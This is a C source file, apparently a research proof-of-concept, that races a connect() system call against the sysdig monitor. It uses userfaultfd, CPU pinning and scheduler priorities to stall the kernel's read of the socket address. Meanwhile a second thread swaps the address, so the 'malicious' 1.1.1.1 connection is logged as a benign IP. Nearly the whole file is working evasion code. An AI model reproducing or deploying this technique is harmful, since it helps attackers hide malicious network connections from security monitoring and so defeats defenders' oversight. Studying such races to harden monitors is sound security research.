#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
// sched
#include <sched.h>
#include <sys/wait.h>
#include <assert.h>
#include <stdbool.h>
// userfaultfd
#include <linux/userfaultfd.h>
// file flag
#include <fcntl.h>
// mmap
#include <sys/mman.h>
// string
#include <string.h>
// gettid
#include <sys/types.h>
#include <syscall.h>
// userfaultfd
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
// POLLER 
#include <poll.h>
// nanosleep
#include <time.h>
// x86-64 Linux
// #define __NR_nanosleep 35
#include <asm/unistd.h>      // compile without -m32 for 64 bit call numbers
// gettimeofday
#include <sys/time.h>      

#include <netdb.h>
#include <netinet/in.h>

#include <string.h>

# define FORCE_INLINE __attribute__((always_inline)) inline

#define handle_error_en(en, msg) \
      do { errno = en; perror(msg); exit(EXIT_FAILURE); } while (0)

#ifndef SYS_gettid
#error "SYS_gettid unavailable on this system"
#endif


#define gettid() ((pid_t)syscall(SYS_gettid))


static int page_size;
static volatile char *page = NULL;
char filename[] = "bad_file";

int  count = 0;
#define COUNT_DONE  20
#define COUNT_HALT1  1
#define COUNT_HALT2  6

pthread_mutex_t count_mutex     = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t condition_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t  condition_cond  = PTHREAD_COND_INITIALIZER;

static void display_thread_sched_attr(char *msg);

static volatile void write_char(char *string, int len) {
  for(int i = 0; i < len; i++) {
    page[i] = string[i];
  }
}

static volatile void write_ip_addr(struct sockaddr_in *serv_addr) {
  // assuming localhost is a good DNS
  // we try to overrite malicious IP (1.1.1.1) with the one
  // so that sysdig can't detect this malicious connect.
  // This is an arbitrary IP we want sysdig to report
  struct hostent *server  = gethostbyname("13.107.42.14");
  bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
}

// benchmark helper
static inline uint64_t rdtsc() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static inline void flush(void *p) {
    asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static int timeofday_loop(int count) {
  struct timeval current_time;
  for (int i = 0; i < count; i++) {
    gettimeofday(&current_time, NULL);
  }
  printf("seconds : %ld\nmicro seconds : %ld",
         current_time.tv_sec, current_time.tv_usec);
}

// receiver waits for the signal from the sender
FORCE_INLINE void receiver() {
  for(;;) {
	  pthread_mutex_lock( &condition_mutex );
    while( count >= COUNT_HALT1 && count <= COUNT_HALT2 )  {
    //while( count < COUNT_HALT1 )  {
      pthread_cond_wait( &condition_cond, &condition_mutex );
    }
    pthread_mutex_unlock( &condition_mutex );
 
    pthread_mutex_lock( &count_mutex );
    count++;
#ifdef VERBOSE
    printf("Counter value receiver: %d\n",count);
#endif
    pthread_mutex_unlock( &count_mutex );

    if(count >= COUNT_DONE) return;

    //return;
  }
}

// sender increments conditional variable and send signal based on COUNT_HALT1
// then it waits in a few more loop iterations
FORCE_INLINE void sender() {
  for(;;) {
	  pthread_mutex_lock( &condition_mutex );
    //if( count >= COUNT_HALT1 ) {
    if( count < COUNT_HALT1 || count > COUNT_HALT2 ) {
	    pthread_cond_signal( &condition_cond );
    }
    pthread_mutex_unlock( &condition_mutex );

    pthread_mutex_lock( &count_mutex );
    count++;
#ifdef VERBOSE
    printf("Counter value sender: %d\n",count);
#endif
    pthread_mutex_unlock( &count_mutex );

    if(count >= COUNT_DONE) return;
  }
}

// set the thread CPU affinity based on cpuid
FORCE_INLINE void set_affinity(int cpuid) 
{
  int s;
  cpu_set_t cpuset;
  pthread_t thread;

  CPU_ZERO(&cpuset);
  /* Set affinity mask to cpuid */
  CPU_SET(cpuid, &cpuset);

  thread = pthread_self();
  s = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
  if (s != 0)
      handle_error_en(s, "pthread_setaffinity_np");

  /* Check the actual affinity mask assigned to the thread */
  s = pthread_getaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
  if (s != 0)
      handle_error_en(s, "pthread_getaffinity_np");

  printf("TID: %d. ", gettid());
  printf("Set returned by pthread_getaffinity_np() contained:\n");
  if (CPU_ISSET(cpuid, &cpuset))
    printf("    CPU %d\n", cpuid);
  else 
    printf("wrong CPU");
}



static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;
    
    set_affinity(1);
    /* Create a page that will be copied into the faulting region */
    if (page == NULL) {
        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            handle_error_en(page, "mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
       file descriptor */
    for (;;) {
        /* See what poll() tells us about the userfaultfd */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            handle_error_en(nready, "poll");
#ifdef VERBOSE        
        printf("\nfault_handler_thread():\n");
        printf("    poll() returns: nready = %d; "
                "POLLIN = %d; POLLERR = %d\n", nready,
                (pollfd.revents & POLLIN) != 0,
                (pollfd.revents & POLLERR) != 0);
#endif        
        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            handle_error_en(nread, "read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Display info about the page-fault event */
#ifdef VERBOSE      
        printf("    UFFD_EVENT_PAGEFAULT event: ");
        printf("flags = %llx; ", msg.arg.pagefault.flags);
        printf("address = %llx\n", msg.arg.pagefault.address);
#endif

        uffdio_copy.src = (unsigned long) page;

        /* We need to handle page faults in units of pages(!).
           So, round faulting address down to page boundary */

        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                           ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;

        asm volatile("mfence");
        //write_char(filename, sizeof(filename));
        //strncpy(page, filename, sizeof(filename));
        asm volatile("mfence");
        flush(page);
        // release mutex
        sender(); 

        //display_thread_sched_attr("Scheduler attributes of fault handler thread");
        //printf("before IOCTL\n"); 
        //fflush(stdout);

        //busyloop(11000000000);
        //busyloop(110000000);
        //busyloop(110000000000000);
        //timeofday_loop(100000000);
        // this faultfd thread cannot sleep, will error below
        //nanosleep_helper(2000000000);
        printf("Before ioctl\n");
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            handle_error_en(-1, "ioctl-UFFDIO_COPY");

        printf("        (uffdio_copy.copy returned %lld)\n",
                uffdio_copy.copy);
    }
}

int
userfaultfd_setup(char *addr, int num_pages)
{
    long uffd;          /* userfaultfd file descriptor */
    //char *addr;         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = num_pages * page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        handle_error_en(-1, "userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        handle_error_en(-1, "ioctl-UFFDIO_API");

    /* Register the memory range of the mapping we just created for
       handling by the userfaultfd object. In mode, we request to track
       missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        handle_error_en(-1, "ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */
    // before that, let's change scheduling priority
    /* Create a thread that will display its scheduling attributes */
    /*
    pthread_attr_t attr;
    int inheritsched = PTHREAD_EXPLICIT_SCHED;
    pthread_attr_setinheritsched(&attr, inheritsched);
    if (s != 0)
      handle_error_en(s, "pthread_attr_setinheritsched");

    int priority = 0;
    int policy = SCHED_RR;
    set_child_scheduling(&attr, policy, priority); 
    s = pthread_create(&thr, &attr, fault_handler_thread, (void *) uffd);
*/
    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        handle_error_en(s, "pthread_create");
    }

    /* Main thread now touches memory in the mapping, touching
       locations 1024 bytes apart. This will trigger userfaultfd
       events for all pages in the region. */
    /*
    int l;
    l = 0xf; */    /* Ensure that faulting address is not on a page
                   boundary, in order to test that we correctly
                   handle that case in fault_handling_thread() */
    /*
    while (l < len) {
        char c = addr[l];
        printf("Read address %p in main(): ", addr + l);
        printf("%c\n", c);
        l += 1024;
        usleep(100000);   
    }*/
    
}


static int
get_policy(char p, int *policy)
{
  switch (p) {
  case 'f': *policy = SCHED_FIFO;     return 1;
  case 'r': *policy = SCHED_RR;       return 1;
  case 'o': *policy = SCHED_OTHER;    return 1;
  case 'i': *policy = SCHED_IDLE;     return 1;
  default:  return 0;
  }
}

static void
display_sched_attr(int policy, struct sched_param *param)
{
  printf("    policy=%s, priority=%d\n",
          (policy == SCHED_FIFO)  ? "SCHED_FIFO" :
          (policy == SCHED_RR)    ? "SCHED_RR" :
          (policy == SCHED_OTHER) ? "SCHED_OTHER" :
          (policy == SCHED_IDLE)  ? "SCHED_IDLE" :
          "???",
          param->sched_priority);
}

static void
display_thread_sched_attr(char *msg)
{
  int policy, s;
  struct sched_param param;

  s = pthread_getschedparam(pthread_self(), &policy, &param);
  if (s != 0)
      handle_error_en(s, "pthread_getschedparam");

  printf("%s\n", msg);
  display_sched_attr(policy, &param);
}


FORCE_INLINE int nanosleep_helper(long nsec)
{
   struct timespec req, rem;
   req.tv_sec = 0;
   req.tv_nsec = nsec;

   ssize_t ret;
   
   asm volatile
   (
       "syscall"
       : "=a" (ret)
       //                      EDI      RSI  
       : "0"(__NR_nanosleep), "D"(&req), "S"(&rem)
       : "rcx", "r11", "memory"
   );
   // note: no error check to saves cycles
   /*ret = nanosleep(&req, &rem);
   if (ret == -1) {
     printf("nanosleep error\n");
   }*/
   return ret;
}


static void *
thread_start(void *arg)
{
  set_affinity(2);

  receiver();
  //asm volatile("mfence");
  write_ip_addr(page);
  //asm volatile("mfence");
  flush(page);
  
  // trigger fault
  int s = mprotect((void *)page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
  if (s != 0) {
    handle_error_en(s, "mprotect");
  }
  return NULL;
}


// set the scheduling priority for each thread
void set_child_scheduling(pthread_attr_t* attr, int policy, int priority) {
  int s;
  struct sched_param param;

  param.sched_priority = priority;

  s = pthread_attr_setschedpolicy(attr, policy);
  if (s != 0)
    handle_error_en(s, "pthread_attr_setschedpolicy");
  s = pthread_attr_setschedparam(attr, &param);
  if (s != 0)
    handle_error_en(s, "pthread_attr_setschedparam");
 
  display_thread_sched_attr("Scheduler settings of main thread");
  printf("\n");
}

void do_connect(struct sockaddr_in *serv_addr) {
   int sockfd, portno, n;
   struct hostent *server;

   char buffer[256];
   portno = 80;

   /* Create a socket point */
   sockfd = socket(AF_INET, SOCK_STREAM, 0);

   if (sockfd < 0) {
      perror("ERROR opening socket");
      exit(1);
   }

   // We assume 1.1.1.1 is a malicious IP that the attacker wants to connect
   server = gethostbyname("1.1.1.1");

   if (server == NULL) {
      fprintf(stderr,"ERROR, no such host\n");
      exit(0);
   }

   bzero((char *) serv_addr, sizeof(*serv_addr));
   serv_addr->sin_family = AF_INET;
   bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
   serv_addr->sin_port = htons(portno);

   /* Now connect to the server */
   printf("%d\n", serv_addr->sin_addr.s_addr);
   if (connect(sockfd, (struct sockaddr*)serv_addr, sizeof(*serv_addr)) < 0) {
      perror("****************** ERROR connecting: attack fail *********************");
      exit(1);
   }
}

int
main(int argc, char *argv[]) {
  int s;
  pthread_attr_t attr;
  pthread_t thread;
  struct sched_param param;
  int policy;

  set_affinity(1);
  
  // set up the page
  page_size = sysconf(_SC_PAGE_SIZE);
  page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED)
      handle_error_en(page, "mmap failure");

  // set up userfaultfd
  s = userfaultfd_setup(page, 1);
  if (s < 0)
    handle_error_en(s, "userfaultfd_setup error");
  
  s = pthread_attr_init(&attr);
  if (s != 0)
    handle_error_en(s, "pthread_attr_init");

  // set up priority for main thread
  int priority = 0;
  param.sched_priority = priority;
  policy = SCHED_IDLE;
  s = pthread_setschedparam(pthread_self(), SCHED_IDLE, &param);

  /* Create a thread that will display its scheduling attributes */
  int inheritsched = PTHREAD_EXPLICIT_SCHED;
  pthread_attr_setinheritsched(&attr, inheritsched);
  if (s != 0)
    handle_error_en(s, "pthread_attr_setinheritsched");

  priority = 42;
  policy = SCHED_RR;
  set_child_scheduling(&attr, policy, priority); 
 
  // start new thread 
  s = pthread_create(&thread, NULL, &thread_start, NULL);
  if (s != 0)
      handle_error_en(s, "pthread_create");

  nanosleep_helper(900000000);
  // connect syscall
  do_connect((struct sockaddr_in*)page);
  exit(EXIT_SUCCESS);
}
